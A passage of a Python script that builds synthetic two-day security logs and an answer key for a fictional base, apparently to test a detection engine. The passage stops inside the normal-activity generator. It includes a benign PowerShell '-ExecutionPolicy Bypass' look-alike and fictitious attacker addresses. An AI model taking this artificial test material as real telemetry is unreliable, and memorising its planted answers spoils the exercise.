"""Synthetic logs for a 50-device base, two days, in the real raw formats + a normalized ECS copy.

  2026-11-21 (Sat)  normal operations only (the engine learns its baseline here)
  2026-11-22 (Sun)  normal operations + approved maintenance + 4 attacks + 4 harmless look-alikes + a silent log source

Devices (50): 28 Windows workstations, 6 Windows servers, 10 Ubuntu servers, 4 gate controllers, 2 network devices.
Internal addresses 10.24.x.x. External addresses only from reserved documentation ranges (192.0.2.0/24,
198.51.100.0/24, 203.0.113.0/24) and domains only under .example, so no real organisation is ever named.

Log sources (raw, in ./logs/):
  Windows   <HOST>_events.jsonl    Security/System events (UTC)                      parser: windows_events
            <HOST>_pfirewall.log   host firewall (local time, UTC+1)                  parser: windows_firewall
            <HOST>_sysmon.jsonl    Sysmon: process create (1), network (3), file (11) parser: windows_sysmon   (NEW)
  Ubuntu    <host>_auth.log, <host>_ufw.log, <host>_syslog (UTC) + <host>_dpkg.log (UTC+1)
  Network   srv-mon-01_zeek-conn.log  Zeek conn.log (JSON) from the core/perimeter SPAN sensor  parser: zeek_conn (NEW)
  Email     srv-mail-01_mailgw.jsonl  mail security gateway verdicts (JSON)                    parser: mail_gateway (NEW)
  Gate controllers and network devices write no logs: their traffic shows up in the servers' logs and in Zeek.

Normalized copy: ./logs_ecs/<same name>.ecs.jsonl, one ECS 8.x document per raw line (same order, same count).

Config written next to the logs:
  sources.yaml        every source (with --legacy: only the six original ones; the new ones go to sources_extra.yaml)
  sources_extra.yaml  only with --legacy
  assets.yaml, maintenance.yaml, truth.json (every planted line, with ATT&CK techniques)
Usage:  python make_fleet.py [--out DIR] [--no-ecs] [--legacy]
"""
from __future__ import annotations

import argparse
import base64
import contextlib
import hashlib
import json
import random
import re
from datetime import datetime, timedelta, timezone
from pathlib import Path

import yaml

ROOT = Path(__file__).resolve().parent
OUT, ECS_OUT = ROOT / "logs", ROOT / "logs_ecs"   # changed by --out
WRITE_ECS = True                                   # --no-ecs: skip the ECS copy (faster; used by the CI test)
DAY1 = datetime(2026, 11, 21, tzinfo=timezone.utc)
DAY2 = DAY1 + timedelta(days=1)
LOCAL = timezone(timedelta(hours=1))
DOMAIN = "base.example"
rng = random.Random(2026)

# ======================================================================= inventory (50 devices)
NAMES = ["a.krasniqi", "b.berisha", "d.gashi", "e.hoxha", "f.morina", "g.kelmendi", "h.rexhepi", "i.bytyqi", "j.osmani",
         "k.zeqiri", "l.hajdari", "m.syla", "n.ahmeti", "o.mustafa", "p.kastrati", "r.dervishi", "s.limani", "t.bajrami",
         "u.rama", "v.sadiku", "z.haliti", "a.maloku", "b.ismaili", "d.jashari", "e.kryeziu", "f.latifi", "g.beqiri", "h.dema"]
NIGHT = {12: "op_night_03", 13: "op_night_02", 14: "op_night_01"}   # ws-base-012..014 also used by the night shift

DEV = []
for i in range(1, 29):
    DEV.append({"host": f"WS-BASE-{i:03d}", "ip": f"10.24.3.{i}", "os": "windows", "type": "workstation",
                "role": "night-shift operator workstation" if i in NIGHT else "operator workstation", "criticality": 3 if i in NIGHT else 2,
                "users": [NAMES[i - 1]] + ([NIGHT[i]] if i in NIGHT else []) + (["svc_ops_night"] if i == 14 else [])})
for host, ip, role, crit in [("srv-auth-01", "10.24.1.10", "domain controller + Kerberos auth server", 5), ("DC-02", "10.24.1.11", "domain controller", 5),
                             ("FS-01", "10.24.2.10", "file server", 4), ("WSUS-01", "10.24.2.21", "patch server (WSUS + apt mirror)", 3),
                             ("JUMP-01", "10.24.1.20", "admin jump host", 4), ("PRINT-01", "10.24.2.30", "print server", 2)]:
    DEV.append({"host": host, "ip": ip, "os": "windows", "type": "server", "role": role, "criticality": crit, "users": []})
for host, ip, role, crit, extra in [
        ("srv-gate-ctrl-01", "10.24.8.19", "gate-control server", 5, ["svc_gate_daemon", "svc_ops_night"]),
        ("srv-gate-ctrl-02", "10.24.8.20", "gate-control server (standby)", 5, ["svc_gate_daemon"]),
        ("srv-logistics-db", "10.24.6.10", "logistics database", 5, ["dbadmin"]),
        ("srv-c2-app", "10.24.7.10", "command & control application", 5, ["svc_c2"]),
        ("srv-web-01", "10.24.5.10", "public web portal (internet-facing)", 3, []),
        ("srv-mail-01", "10.24.5.20", "mail security gateway (internet-facing)", 3, []),
        ("srv-proxy-01", "10.24.5.30", "web proxy", 3, []),
        ("srv-dns-01", "10.24.1.53", "DNS", 4, []),
        ("srv-backup-02", "10.24.2.20", "backup server", 4, ["bkp_svc"]),
        ("srv-mon-01", "10.24.6.40", "monitoring + network sensor (Zeek) + vulnerability scanner", 3, ["svc_mon", "svc_vulnscan"])]:
    DEV.append({"host": host, "ip": ip, "os": "linux", "type": "server", "role": role, "criticality": crit, "users": ["adm.ops"] + extra})
for i in range(1, 5):
    DEV.append({"host": f"gate-{i:02d}", "ip": f"10.24.8.{100 + i}", "os": "embedded", "type": "gate controller",
                "role": "gate controller (polled by gate-control server)", "criticality": 5, "users": []})
DEV.append({"host": "fw-edge-01", "ip": "10.24.0.1", "os": "network", "type": "network", "role": "perimeter firewall", "criticality": 5, "users": []})
DEV.append({"host": "vpn-gw-01", "ip": "10.24.0.5", "os": "network", "type": "network", "role": "VPN gateway", "criticality": 4, "users": []})
assert len(DEV) == 50

# ---- keep the fleet in step with Member 1's asset inventory (backend/data/assets.json), so OSINT and SOC name the same
# machines: same host, same IP, and their accounts exist. A clash (same IP on two different machines) stops the run.
ASSETS_JSON = Path(__file__).resolve().parents[2] / "data" / "assets.json"   # backend/data/assets.json


def align_with_inventory(devices: list[dict], path: Path = ASSETS_JSON) -> list[str]:
    if not path.exists():
        return [f"note: {path} not found, fleet not aligned"]
    notes, by_name = [], {d["host"].lower(): d for d in devices}
    for a in json.loads(path.read_text(encoding="utf-8")):
        name, ip = str(a.get("asset_id", "")).lower(), a.get("ip")
        d = by_name.get(name)
        if d is None:
            notes.append(f"note: {name} ({ip}) is in assets.json but not in the synthetic fleet")
            continue
        other = next((x for x in devices if x["ip"] == ip and x is not d), None)
        if other:
            raise SystemExit(f"IP clash: assets.json puts {name} on {ip}, the fleet has {other['host']} there. Fix make_fleet.py.")
        if ip and d["ip"] != ip:
            notes.append(f"aligned: {d['host']} {d['ip']} -> {ip} (from assets.json)")
            d["ip"] = ip
        for acc in a.get("accounts", []):
            if acc not in d["users"]:
                d["users"].append(acc)
    return notes


ALIGN_NOTES = align_with_inventory(DEV)
assert len({d["ip"] for d in DEV}) == len(DEV), "two devices share an IP"

BY = {d["host"]: d for d in DEV}
IP = {d["host"]: d["ip"] for d in DEV}
HOST_OF_IP = {d["ip"]: d["host"] for d in DEV}
WS = [d for d in DEV if d["type"] == "workstation"]
WIN = [d for d in DEV if d["os"] == "windows"]
LNX = [d for d in DEV if d["os"] == "linux"]
ADMIN_WS = "WS-BASE-001"                                   # IT admin's workstation, RDPs to the jump host
ATTACKER, SPRAYER, ROGUE = "203.0.113.66", "198.51.100.23", "10.24.99.50"
PHISH_MTA, C2_SERVER, BADMAIL_MTA = "203.0.113.140", "203.0.113.77", "203.0.113.150"
VISITORS = [f"192.0.2.{i}" for i in range(1, 255)] + [f"198.51.100.{i}" for i in range(100, 255)]
PARTNERS = [("mod-hq.example", "198.51.100.120"), ("logistics-partner.example", "198.51.100.131"),
            ("supplier-a.example", "192.0.2.41"), ("allied-hq.example", "192.0.2.77"), ("newsletter.example", "203.0.113.20")]
SPAMMERS = [("promo-deals.example", "192.0.2.201"), ("crypto-win.example", "198.51.100.211"), ("cheap-meds.example", "192.0.2.222")]


def at(day, h, m=0, s=0):
    return day + timedelta(hours=h, minutes=m, seconds=s)


def rt(day, h0=0.0, h1=24.0):
    return day + timedelta(seconds=rng.uniform(h0 * 3600, h1 * 3600 - 1))


def sha(s):
    return hashlib.sha256(s.encode()).hexdigest()


def iso(t):
    return t.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def mail_of(user):
    return f"{user}@{DOMAIN}"


# ======================================================================= ECS helpers
def ecs(t, host, dataset, text, category, etype, action, outcome=None, **extra):
    d = BY.get(host, {})
    e = {"@timestamp": iso(t), "ecs": {"version": "8.11.0"},
         "event": {"kind": "event", "category": category if isinstance(category, list) else [category],
                   "type": etype if isinstance(etype, list) else [etype], "action": action,
                   "module": dataset.split(".")[0], "dataset": dataset, "original": text},
         "host": {"name": host, **({"ip": [d["ip"]]} if d.get("ip") else {}), **({"os": {"type": d["os"]}} if d.get("os") else {})}}
    if outcome:
        e["event"]["outcome"] = outcome
    for k, v in extra.items():
        if v not in (None, {}, []):
            e[k] = v
    return e


def endpoint(ip, port=None):
    r = {"ip": ip}
    if port is not None:
        r["port"] = int(port)
    return r


def win_user(u):
    if not u:
        return None
    dom, _, name = u.rpartition("\\")
    return {"name": name, **({"domain": dom} if dom else {})}


def basename(p):
    return p.replace("/", "\\").split("\\")[-1]


WIN_ECS = {  # event id -> (category, type, action)
    4624: ("authentication", ["start"], "logged-in"), 4625: ("authentication", ["start"], "logon-failed"),
    4634: ("authentication", ["end"], "logged-out"), 4672: ("iam", ["admin"], "special-privileges-assigned"),
    4688: ("process", ["start"], "created-process"), 7045: ("configuration", ["creation"], "service-installed"),
    19: ("package", ["installation"], "update-installed"), 4947: ("configuration", ["change"], "firewall-rule-modified"),
    1102: ("configuration", ["deletion"], "audit-log-cleared"), 4698: ("configuration", ["creation"], "scheduled-task-created"),
}
SYSMON_ECS = {1: ("process", ["start"], "process-created"), 3: ("network", ["connection", "start"], "network-connection"),
              11: ("file", ["creation"], "file-created")}


def ecs_linux(host, kind, t, prog, msg, text):
    ds = {"auth.log": "system.auth", "syslog": "system.syslog", "ufw.log": "ufw.log"}[kind]
    proc = {"name": prog.split("[")[0]}
    if m := re.match(r"Accepted (\w+) for (\S+) from (\S+) port (\d+)", msg):
        return ecs(t, host, ds, text, "authentication", ["start"], "ssh_login", "success", user={"name": m[2]},
                   source=endpoint(m[3], m[4]), process=proc, system={"auth": {"ssh": {"method": m[1]}}})
    if m := re.match(r"Failed password for (?:invalid user )?(\S+) from (\S+) port (\d+)", msg):
        return ecs(t, host, ds, text, "authentication", ["start"], "ssh_login", "failure", user={"name": m[1]},
                   source=endpoint(m[2], m[3]), process=proc)
    if m := re.match(r"(\S+) : TTY=\S+ ; PWD=\S+ ; USER=(\S+) ; COMMAND=(.*)", msg):
        return ecs(t, host, ds, text, "process", ["start"], "sudo", "success", user={"name": m[1], "effective": {"name": m[2]}},
                   process={"name": "sudo", "command_line": m[3], "executable": m[3].split()[0]})
    if m := re.match(r"new user: name=([^,]+)", msg):
        return ecs(t, host, ds, text, "iam", ["user", "creation"], "user-created", "success", user={"name": m[1]}, process=proc)
    if m := re.match(r"pam_unix\(cron:session\): session (opened|closed) for user (\S+)", msg):
        return ecs(t, host, ds, text, "session", ["start" if m[1] == "opened" else "end"], f"session-{m[1]}", "success",
                   user={"name": m[2].split("(")[0]}, process=proc)
    if m := re.match(r"Started (\S+)\.service", msg):
        return ecs(t, host, ds, text, "process", ["start"], "service-started", "success", service={"name": m[1]}, process=proc)
    return ecs(t, host, ds, text, "host", ["info"], "log", process=proc)


# ======================================================================= log writers
class Logs:
    def __init__(self):
        self.files: dict[str, list] = {}
        self.rid = 100000

    def add(self, name, t, text, label=None, doc=None):
        doc.setdefault("log", {})["file"] = {"path": name}   # the truth label stays in truth.json, never in the data
        self.files.setdefault(name, []).append((t, text, label, doc))

    # ---- Windows Security/System
    def win(self, host, t, eid, data, log="Security", label=None):
        self.rid += 1
        rec = {"TimeCreated": t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z", "Id": eid, "LogName": log,
               "MachineName": host, "RecordId": self.rid, "EventData": data}
        text = json.dumps(rec)
        cat, typ, act = WIN_ECS.get(eid, ("host", ["info"], f"event-{eid}"))
        user = data.get("TargetUserName") or data.get("SubjectUserName") or data.get("AccountName")
        ip = data.get("IpAddress")
        doc = ecs(t, host, "windows.security" if log == "Security" else "windows.system", text, cat, typ, act,
                  "failure" if eid == 4625 else "success",
                  user={"name": user, **({"domain": data["TargetDomainName"]} if data.get("TargetDomainName") else {})} if user else None,
                  source=endpoint(ip) if ip and ip != "-" else None,
                  process={"executable": data["NewProcessName"], "name": basename(data["NewProcessName"])} if data.get("NewProcessName") else None,
                  service={"name": data["ServiceName"]} if data.get("ServiceName") else None,
                  package={"name": data["updateTitle"]} if data.get("updateTitle") else None,
                  rule={"name": data["RuleName"]} if data.get("RuleName") else None,
                  winlog={"channel": log, "event_id": str(eid), "record_id": self.rid, "computer_name": host, "event_data": data,
                          **({"logon": {"type": data["LogonType"]}} if data.get("LogonType") else {})})
        doc["event"]["code"] = str(eid)
        self.add(f"{host}_events.jsonl", t, text, label, doc)

    # ---- Sysmon
    def sysmon(self, host, t, eid, data, label=None):
        self.rid += 1
        data = {"RuleName": "-", "UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.") + f"{t.microsecond // 1000:03d}", **data}
        rec = {"TimeCreated": t.strftime("%Y-%m-%dT%H:%M:%S.") + f"{t.microsecond // 1000:03d}Z", "Id": eid,
               "LogName": "Microsoft-Windows-Sysmon/Operational", "MachineName": host, "RecordId": self.rid, "EventData": data}
        text = json.dumps(rec)
        cat, typ, act = SYSMON_ECS[eid]
        img = data.get("Image", "")
        proc = {"executable": img, "name": basename(img), "pid": data.get("ProcessId"),
                **({"command_line": data["CommandLine"]} if "CommandLine" in data else {}),
                **({"parent": {"executable": data["ParentImage"], "name": basename(data["ParentImage"]),
                               "command_line": data.get("ParentCommandLine")}} if "ParentImage" in data else {}),
                **({"hash": {"sha256": data["Hashes"].split("=", 1)[1]}} if "Hashes" in data else {})}
        doc = ecs(t, host, "windows.sysmon_operational", text, cat, typ, act, "success", process=proc, user=win_user(data.get("User")),
                  source=endpoint(data["SourceIp"], data["SourcePort"]) if eid == 3 else None,
                  destination=endpoint(data["DestinationIp"], data["DestinationPort"]) if eid == 3 else None,
                  network={"transport": data["Protocol"], "direction": "egress" if not data["DestinationIp"].startswith("10.24.") else "internal"} if eid == 3 else None,
                  file={"path": data["TargetFilename"], "name": basename(data["TargetFilename"])} if eid == 11 else None,
                  winlog={"channel": "Microsoft-Windows-Sysmon/Operational", "event_id": str(eid), "record_id": self.rid, "computer_name": host})
        doc["event"]["code"] = str(eid)
        self.add(f"{host}_sysmon.jsonl", t, text, label, doc)

    # ---- Windows firewall
    def wfw(self, host, t, action, proto, src, dst, sport, dport, path, label=None):
        lt = t.astimezone(LOCAL)
        text = f"{lt:%Y-%m-%d %H:%M:%S} {action} {proto} {src} {dst} {sport} {dport} 0 - 0 0 0 - - - {path}"
        doc = ecs(t, host, "windows_firewall.log", text, "network", ["connection", "allowed" if action == "ALLOW" else "denied"],
                  action.lower(), "success" if action == "ALLOW" else "failure", source=endpoint(src, sport), destination=endpoint(dst, dport),
                  network={"transport": proto.lower(), "direction": "outbound" if path == "SEND" else "inbound"})
        self.add(f"{host}_pfirewall.log", t, text, label, doc)

    # ---- Linux
    def lx(self, host, kind, t, prog, msg, label=None, doc=None):
        text = f"{t:%Y-%m-%dT%H:%M:%S.%f}+00:00 {host} {prog}: {msg}"
        self.add(f"{host}_{kind}", t, text, label, doc or ecs_linux(host, kind, t, prog, msg, text))

    def ufw(self, host, t, act, src, dst, spt, dpt, inbound=True, proto="TCP", label=None):
        io = "IN=ens33 OUT=" if inbound else "IN= OUT=ens33"
        msg = (f"[{rng.randint(1000, 99999)}.{rng.randint(100, 999)}] [UFW {act}] {io} MAC=00:0c:29:aa:bb:cc "
               f"SRC={src} DST={dst} LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID={rng.randint(1, 65000)} DF PROTO={proto} SPT={spt} DPT={dpt} "
               f"WINDOW=64240 RES=0x00 SYN URGP=0")
        text = f"{t:%Y-%m-%dT%H:%M:%S.%f}+00:00 {host} kernel: {msg}"
        doc = ecs(t, host, "ufw.log", text, "network", ["connection", "allowed" if act == "ALLOW" else "denied"], act.lower(),
                  "success" if act == "ALLOW" else "failure", source=endpoint(src, spt), destination=endpoint(dst, dpt),
                  network={"transport": proto.lower(), "direction": "inbound" if inbound else "outbound"})
        self.lx(host, "ufw.log", t, "kernel", msg, label, doc)

    def dpkg(self, host, t, pkg, old, new, label=None):
        text = f"{t.astimezone(LOCAL):%Y-%m-%d %H:%M:%S} upgrade {pkg}:amd64 {old} {new}"
        doc = ecs(t, host, "system.dpkg", text, "package", ["upgrade"], "package-upgraded", "success",
                  package={"name": pkg, "version": new, "architecture": "amd64"})
        self.add(f"{host}_dpkg.log", t, text, label, doc)

    # ---- Zeek conn.log (network sensor on srv-mon-01, SPAN of core switch + perimeter)
    def flow(self, t, src, sport, dst, dport, proto="tcp", state="SF", label=None):
        proto = proto.lower()
        svc = {53: "dns", 22: "ssh", 25: "smtp", 443: "ssl", 993: "ssl", 3389: "rdp", 445: "smb", 88: "krb_tcp", 389: "ldap",
               3128: "http", 8530: "http", 5432: "postgresql", 873: "rsync", 502: "modbus", 9100: None, 8080: "http"}.get(dport)
        uid = "C" + "".join(rng.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(17))
        rec = {"ts": round(t.timestamp(), 6), "uid": uid, "id.orig_h": src, "id.orig_p": int(sport), "id.resp_h": dst, "id.resp_p": int(dport),
               "proto": proto}
        if svc and state == "SF":
            rec["service"] = svc
        if state == "SF":
            ob, rb = rng.randint(60, 4000), rng.randint(60, 40000)
            rec.update({"duration": round(rng.uniform(0.002, 4.0), 6), "orig_bytes": ob, "resp_bytes": rb, "conn_state": "SF",
                        "history": "Dd" if proto == "udp" else "ShADadFf", "orig_pkts": max(1, ob // 500), "resp_pkts": max(1, rb // 1200)})
        else:
            rec.update({"duration": 0.0 if state == "REJ" else None, "orig_bytes": 0, "resp_bytes": 0, "conn_state": state,
                        "history": "Sr" if state == "REJ" else "S", "orig_pkts": 1 if state == "REJ" else 2, "resp_pkts": 1 if state == "REJ" else 0})
            rec = {k: v for k, v in rec.items() if v is not None}
        rec.update({"local_orig": src.startswith("10.24."), "local_resp": dst.startswith("10.24."), "missed_bytes": 0})
        text = json.dumps(rec)
        direction = "internal" if rec["local_orig"] and rec["local_resp"] else ("outbound" if rec["local_orig"] else "inbound")
        doc = ecs(t, "srv-mon-01", "zeek.connection", text, "network", ["connection"], "connection",
                  "success" if state == "SF" else "failure", source={**endpoint(src, sport), **({"bytes": rec["orig_bytes"]})},
                  destination={**endpoint(dst, dport), "bytes": rec["resp_bytes"]},
                  network={"transport": proto, "direction": direction, **({"protocol": svc} if svc and state == "SF" else {})},
                  observer={"hostname": "srv-mon-01", "type": "sensor", "vendor": "Zeek"},
                  zeek={"session_id": uid, "connection": {"state": state, "history": rec["history"]}})
        if "duration" in rec:
            doc["event"]["duration"] = int(rec["duration"] * 1e9)
        self.add("srv-mon-01_zeek-conn.log", t, text, label, doc)

    # ---- Mail security gateway
    def mail(self, t, direction, client_ip, helo, frm, to, subject, verdict="clean", action="delivered", score=None,
             attachments=(), urls=(), spf="pass", dkim="pass", dmarc="pass", label=None):
        to = list(to)
        mid = f"<{rng.getrandbits(64):016x}.{rng.randint(1000, 9999)}@{frm.split('@')[1]}>"
        score = round(rng.uniform(0.0, 1.8), 1) if score is None else score
        rec = {"ts": iso(t), "gateway": "srv-mail-01", "direction": direction, "msg_id": mid, "client_ip": client_ip, "helo": helo,
               "from": frm, "to": to, "subject": subject, "size": rng.randint(4000, 90000) + 40000 * len(attachments),
               "spf": spf, "dkim": dkim, "dmarc": dmarc, "attachments": list(attachments), "urls": list(urls),
               "score": score, "verdict": verdict, "action": action, "policy": f"{direction} (quarantine >= 5.0)"}
        text = json.dumps(rec)
        doc = ecs(t, "srv-mail-01", "mail_gateway.log", text, "email", ["info"], action,
                  "success" if action == "delivered" else "failure", source=endpoint(client_ip),
                  email={"direction": direction, "message_id": mid, "from": {"address": [frm]}, "to": {"address": to},
                         "subject": subject, "attachments": [{"file": {"name": a["name"], "mime_type": a["type"],
                                                                       "hash": {"sha256": a["sha256"]}}} for a in attachments]},
                  url={"original": urls[0]} if urls else None,
                  mail_gateway={"verdict": verdict, "score": score, "spf": spf, "dkim": dkim, "dmarc": dmarc, "helo": helo})
        self.add("srv-mail-01_mailgw.jsonl", t, text, label, doc)
        return mid


L = Logs()

# Sysmon image per destination port for normal outbound traffic of a Windows host
PORT_IMAGE = {53: "C:\\Windows\\System32\\svchost.exe", 3128: "C:\\Program Files\\Mozilla Firefox\\firefox.exe", 445: "System",
              88: "C:\\Windows\\System32\\lsass.exe", 389: "C:\\Windows\\System32\\lsass.exe", 9100: "C:\\Windows\\System32\\spoolsv.exe",
              993: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", 3389: "C:\\Windows\\System32\\mstsc.exe",
              8530: "C:\\Windows\\System32\\svchost.exe", 22: "C:\\Windows\\System32\\OpenSSH\\ssh.exe"}
SYSTEM_IMAGES = {"System", "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\lsass.exe", "C:\\Windows\\System32\\spoolsv.exe"}


def pid():
    return rng.randint(800, 15000)


def guid():
    return "{" + f"{rng.getrandbits(32):08x}-{rng.getrandbits(16):04x}-6541-0000-{rng.getrandbits(48):012x}" + "}"


def proc_start(host, t, image, cmd, user, parent, parent_cmd=None, label=None, security_too=True):
    """Process creation: Sysmon 1, and Security 4688 (as on hosts with process auditing on)."""
    L.sysmon(host, t, 1, {"ProcessGuid": guid(), "ProcessId": pid(), "Image": image, "CommandLine": cmd,
                          "CurrentDirectory": "C:\\Windows\\system32\\", "User": user if "\\" in user else f"BASE\\{user}",
                          "LogonId": f"0x{rng.getrandbits(24):x}", "IntegrityLevel": "System" if "SYSTEM" in user else "Medium",
                          "Hashes": f"SHA256={sha(basename(image).lower()).upper()}", "ParentImage": parent,
                          "ParentCommandLine": parent_cmd or f"\"{parent}\""}, label)
    if security_too:
        L.win(host, t + timedelta(milliseconds=5), 4688, {"SubjectUserName": user.split("\\")[-1], "NewProcessName": image,
                                                          "CommandLine": cmd, "ParentProcessName": parent}, label=label)


def conn(src_host, dst_host, port, t, proto="TCP", label=None, src_ip=None, image=None, user=None, state="SF"):
    """One connection, written to every log that would see it: source/destination host firewall, Sysmon, Zeek."""
    s_ip = src_ip or IP.get(src_host, src_host)   # outside addresses have no device entry
    d_ip = IP[dst_host] if dst_host in IP else dst_host
    sport = rng.randint(49152, 65000)
    sb, db = BY.get(src_host, {}), BY.get(dst_host, {})
    ok = state == "SF"
    if sb.get("os") == "windows":
        L.wfw(src_host, t, "ALLOW", proto, s_ip, d_ip, sport, port, "SEND", label)
        img = image or PORT_IMAGE.get(port, "C:\\Windows\\System32\\svchost.exe")
        u = user or ("NT AUTHORITY\\SYSTEM" if img in SYSTEM_IMAGES or not sb["users"] else f"BASE\\{sb['users'][0]}")
        L.sysmon(src_host, t + timedelta(milliseconds=40), 3, {"ProcessGuid": guid(), "ProcessId": pid(), "Image": img, "User": u,
                                                                "Protocol": proto.lower(), "Initiated": "true", "SourceIsIpv6": "false",
                                                                "SourceIp": s_ip, "SourcePort": sport, "DestinationIsIpv6": "false",
                                                                "DestinationIp": d_ip, "DestinationPort": port}, label)
    if sb.get("os") == "linux":
        L.ufw(src_host, t, "ALLOW", s_ip, d_ip, sport, port, inbound=False, proto=proto, label=label)
    if db.get("os") == "windows":
        L.wfw(dst_host, t + timedelta(milliseconds=300), "ALLOW" if ok else "DROP", proto, s_ip, d_ip, sport, port, "RECEIVE", label)
    if db.get("os") == "linux":
        L.ufw(dst_host, t + timedelta(milliseconds=300), "ALLOW" if ok else "BLOCK", s_ip, d_ip, sport, port, inbound=True, proto=proto, label=label)
    L.flow(t, s_ip, sport, d_ip, port, proto, state, label)


def logon(host, t, user, ltype, src_ip="-", ok=True, label=None):
    L.win(host, t, 4624 if ok else 4625, {"TargetUserName": user, "TargetDomainName": "BASE", "IpAddress": src_ip,
                                          "LogonType": str(ltype), **({} if ok else {"FailureReason": "%%2313"})}, label=label)


OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"
EXPLORER = "C:\\Windows\\explorer.exe"
USER_APPS = ["C:\\Program Files\\Mozilla Firefox\\firefox.exe", OFFICE + "WINWORD.EXE", OFFICE + "EXCEL.EXE", OFFICE + "OUTLOOK.EXE",
             "C:\\Windows\\System32\\notepad.exe", "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe"]


# ======================================================================= normal operations (both days)
def normal_mail(day):
    users = [d["users"][0] for d in WS]
    for _ in range(190):                                             # legitimate inbound mail
        dom, ip = rng.choice(PARTNERS)
        t = rt(day, 6, 20) if rng.random() < 0.9 else rt(day)
        att = [{"name": rng.choice(["report.pdf", "schedule.xlsx", "minutes.docx", "orders.pdf"]), "type": "application/pdf",
                "sha256": sha(str(rng.random()))}] if rng.random() < 0.3 else []
        conn(ip, "srv-mail-01", 25, t - timedelta(seconds=2))
        L.mail(t, "inbound", ip, f"mx.{dom}", f"{rng.choice(['info', 'ops', 'duty', 'news', 'logistics'])}@{dom}",
               [mail_of(rng.choice(users))], rng.choice(["Weekly logistics report", "Meeting minutes", "Duty roster update",
                                                         "Delivery confirmation", "Newsletter November", "Training schedule"]),
               attachments=att)
    for _ in range(40):                                              # ordinary spam, quarantined by the gateway (routine)
        dom, ip = rng.choice(SPAMMERS)
        t = rt(day)
        conn(ip, "srv-mail-01", 25, t - timedelta(seconds=2))
        L.mail(t, "inbound", ip, f"smtp.{dom}", f"offers@{dom}", [mail_of(rng.choice(users))],
               rng.choice(["You have won!", "Limited offer 90% off", "Your account bonus"]), verdict="spam", action="quarantined",
               score=round(rng.uniform(5.5, 9.0), 1), spf="fail", dkim="none", dmarc="fail", urls=[f"http://{dom}/claim"])
    for _ in range(70):                                              # outbound mail, working hours
        dom, ip = rng.choice(PARTNERS[:4])
        t = rt(day, 8, 17)
        conn("srv-mail-01", ip, 25, t + timedelta(seconds=1))
        L.mail(t, "outbound", IP["srv-mail-01"], f"mail.{DOMAIN}", mail_of(rng.choice(users)), [f"duty@{dom}"],
               rng.choice(["RE: Weekly logistics report", "Requested documents", "RE: Delivery confirmation"]))


def normal_day(day):
    for d in WS:                                                     # ---------------- workstations
        h, user = d["host"], d["users"][0]
        start = rt(day, 7.4, 8.8)
        logon(h, start, user, 2)
        proc_start(h, start + timedelta(seconds=3), "C:\\Windows\\System32\\userinit.exe", "C:\\Windows\\system32\\userinit.exe",
                   user, "C:\\Windows\\System32\\winlogon.exe", security_too=False)
        proc_start(h, start + timedelta(seconds=5), EXPLORER, EXPLORER, user, "C:\\Windows\\System32\\userinit.exe", security_too=False)
        L.win(h, rt(day, 16.4, 17.6), 4634, {"TargetUserName": user, "LogonType": "2"})
        for _ in range(rng.randint(8, 20)):                          # user programs
            img = rng.choice(USER_APPS)
            proc_start(h, rt(day, 8, 17), img, f"\"{img}\"", user, EXPLORER)
        for _ in range(rng.randint(4, 10)):                          # background system processes
            proc_start(h, rt(day), "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
                       "NT AUTHORITY\\SYSTEM", "C:\\Windows\\System32\\services.exe", security_too=False)
        # daily IT inventory script (scheduled task, PowerShell, SYSTEM): a harmless PowerShell look-alike, both days
        proc_start(h, at(day, 10, 0, rng.randint(0, 59)), "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                   "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \\\\FS-01\\it$\\inventory.ps1", "NT AUTHORITY\\SYSTEM",
                   "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule")
        for _ in range(rng.randint(1, 4)):
            logon(h, rt(day, 9, 16.5), user, 7)                      # unlock
        if rng.random() < 0.15:                                      # one typo at the keyboard: harmless
            t = rt(day, 9, 16)
            logon(h, t, user, 7, ok=False)
            logon(h, t + timedelta(seconds=8), user, 7)
        for _ in range(6):
            logon(h, rt(day), "SYSTEM", 5)
        logon(h, at(day, 10, 0, rng.randint(0, 59)), "adm.win", 3, IP["JUMP-01"])   # inventory-style admin check
        if d["host"] == ADMIN_WS:
            conn(h, "JUMP-01", 3389, at(day, 9, 30))
            logon("JUMP-01", at(day, 9, 30, 2), "adm.win", 10, d["ip"])
        if h in [f"WS-BASE-{n:03d}" for n in NIGHT]:                 # night shift on the same workstation
            nu = d["users"][-1] if d["host"] != "WS-BASE-014" else "op_night_01"
            logon(h, at(day, 20, rng.randint(0, 25)), nu, 2)
            L.win(h, at(day, 23, 55), 4634, {"TargetUserName": nu, "LogonType": "2"})
            logon(h, at(day, 0, rng.randint(1, 20)), nu, 2)          # shift continues after midnight
            for _ in range(rng.randint(3, 6)):
                img = rng.choice(USER_APPS[:2])
                proc_start(h, rt(day, 20.5, 23.5), img, f"\"{img}\"", nu, EXPLORER)
            if d["host"] == "WS-BASE-014":
                logon(h, at(day, 0, 40), "svc_ops_night", 5)
        # fixed set of servers this workstation uses every day (so nothing normal is "new" on day 2)
        peers = [("srv-dns-01", 53, "UDP"), ("srv-proxy-01", 3128, "TCP"), ("FS-01", 445, "TCP"), ("srv-auth-01", 88, "TCP"),
                 ("srv-auth-01", 389, "TCP"), ("DC-02", 88, "TCP"), ("srv-mail-01", 993, "TCP")] + \
                ([("PRINT-01", 9100, "TCP")] if int(h[-3:]) % 3 == 0 else [])
        for dst, port, proto in peers:
            for k in range(1 if dst.startswith("DC") or dst == "PRINT-01" else rng.randint(4, 12)):
                conn(h, dst, port, rt(day, 8, 17) if k else rt(day, 7.5, 9), proto)
        for dc in ("srv-auth-01", "DC-02"):                                # network logons recorded on the domain controllers
